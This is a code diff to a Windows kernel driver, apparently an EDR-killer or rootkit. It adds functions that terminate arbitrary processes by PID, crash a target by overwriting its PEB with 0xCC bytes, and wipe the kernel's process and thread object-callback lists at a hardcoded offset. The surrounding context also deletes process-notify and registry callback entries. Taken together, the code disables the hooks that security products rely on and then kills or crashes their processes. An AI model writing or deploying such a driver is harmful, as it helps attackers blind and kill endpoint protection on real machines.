@@ -2,6 +2,136 @@
 
 
 
+extern "C" NTSTATUS ZwQueryInformationProcess(
+    IN HANDLE ProcessHandle,
+    IN PROCESSINFOCLASS ProcessInformationClass,
+    OUT PVOID ProcessInformation,
+    IN ULONG ProcessInformationLength,
+    OUT PULONG ReturnLength OPTIONAL);
+
+
+NTSTATUS TermProcess(ULONG_PTR pidVal) {
+    NTSTATUS status;
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa;
+    CLIENT_ID cid;
+
+    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+    cid.UniqueProcess = (HANDLE)pidVal;
+    cid.UniqueThread = NULL;
+
+    status = ZwOpenProcess(&hProcess, 1, &oa, &cid);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] ZwOpenProcess failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pidVal, status);
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    status = ZwTerminateProcess(hProcess, STATUS_SUCCESS);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] ZwTerminateProcess failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pidVal, status);
+    }
+    else {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+            "[%s] Terminated PID %llu\n",
+            DRIVER_NAME, (unsigned long long)pidVal);
+    }
+
+    ZwClose(hProcess);
+
+    return STATUS_SUCCESS;
+}
+
+NTSTATUS crashProcess(ULONG_PTR pidVal) {
+    NTSTATUS status;
+    HANDLE hProcess;
+
+    PEPROCESS eProcess = NULL;
+    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pidVal, status);
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    status = ObOpenObjectByPointer(eProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] ObOpenObjectByPointer failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pidVal, status);
+        return STATUS_UNSUCCESSFUL;
+    }
+    // attacchiamo il current kernel thread al target process address space
+    KAPC_STATE apcState;
+    KeStackAttachProcess(eProcess, &apcState);
+
+    PROCESS_BASIC_INFORMATION pbi;
+    ULONG returnLength = 0;
+
+
+    // queryaimo info basic sui processi per prendere il PEB base address
+    status = ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
+            "[%s] ZwQueryInformationProcess failed for PID %llu (0x%08X)\n",
+            DRIVER_NAME, (unsigned long long)pidVal, status);
+        KeUnstackDetachProcess(&apcState);
+        ZwClose(hProcess);
+        return STATUS_UNSUCCESSFUL;
+
+    }
+    PVOID baseAddress = pbi.PebBaseAddress;
+    SIZE_T size = 4096;
+
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
+        "[%s] Crashing PID %llu by writing to PEB at address 0x%p\n",
+        DRIVER_NAME, (unsigned long long)pidVal, baseAddress);
+
+    // MDL Memry Descriptor List per il target process.
+    if (baseAddress != NULL) {
+        PMDL mdl = IoAllocateMdl(baseAddress, (ULONG)size, FALSE, FALSE, NULL);
+        if (mdl != NULL) {
+            DbgPrintEx(0, 0, "Mdl Allocated\n");
+
+            __try {
+                // lockiamo le pagine in memoria fisica e prepariamo per accesso
+                MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
+                DbgPrintEx(0, 0, "pages locked\n");
+
+                PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
+
+                if (mappedAddress != NULL) {
+                    DbgPrintEx(0, 0, "pages mapped at address: %p\n", mappedAddress);
+
+                    RtlFillMemory(mappedAddress, size, 0xcc);
+                    DbgPrintEx(0, 0, "[%s] Memory corrupted.\n", DRIVER_NAME);
+                    MmUnmapLockedPages(mappedAddress, mdl);
+                    DbgPrintEx(0, 0, "[%s] Pages unmapped.\n", DRIVER_NAME);
+                }
+                // unlock pages
+                MmUnlockPages(mdl);
+                DbgPrintEx(0, 0, "[%s] Pages unlocked.\n", DRIVER_NAME);
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                DbgPrintEx(0, 0, "[%s] Exception while accessing process memory.\n", DRIVER_NAME);
+                return STATUS_UNSUCCESSFUL;
+            }
+            IoFreeMdl(mdl);
+        }
+    }
+    KeUnstackDetachProcess(&apcState);
+
+
+    ZwClose(hProcess);
+    ObDereferenceObject(eProcess);
+
+    return STATUS_SUCCESS;
+}
+
 ModulesData* EnumRegisteredDrivers(UINT64 NotifyArrayAddr) {
     ModulesData moduleInfo = { 0 };
     NTSTATUS status = STATUS_SUCCESS;
@@ -352,6 +482,7 @@ NTSTATUS DeleteNotifyEntry(ULONG64 procNotifyArrayAddr, int  indexToRemove) {
 	}
 }
 
+
 NTSTATUS DeleteRegCallbackEntry(ULONG64 regCallbackArrayAddr) {
 	LIST_ENTRY* listHead = (LIST_ENTRY*)regCallbackArrayAddr;
     listHead->Flink = listHead;
@@ -365,6 +496,28 @@ NTSTATUS DeleteRegCallbackEntry(ULONG64 regCallbackArrayAddr) {
         DbgPrintEx(0, 0, "[%s] Failed to remove registry callback entry\n", DRIVER_NAME);
         return STATUS_UNSUCCESSFUL;
 	}
+}
+
+NTSTATUS RemObjCallbackNotifyRoutineAddress() {
+    DWORD64 ProcessObjectType = (DWORD64)*PsProcessType;
+    DWORD64 ThreadObjectType = (DWORD64)*PsThreadType;
+
+    LIST_ENTRY* procListHead = (LIST_ENTRY*)(ProcessObjectType + 0xc8);
+    procListHead->Flink = procListHead;
+	procListHead->Blink = procListHead;
+
+	LIST_ENTRY* threadListHead = (LIST_ENTRY*)(ThreadObjectType + 0xc8);
+	threadListHead->Flink = threadListHead;
+	threadListHead->Blink = threadListHead;
+
+    if (procListHead->Flink == procListHead && procListHead->Blink == procListHead) {
+        DbgPrintEx(0, 0, "[%s] Successfully removed object callback entry\n", DRIVER_NAME);
+    }
+    else {
+        DbgPrintEx(0, 0, "[%s] Failed to remove process callback entry\n", DRIVER_NAME);
+        return STATUS_UNSUCCESSFUL;
+    }
+    return 0;
 }
 
 
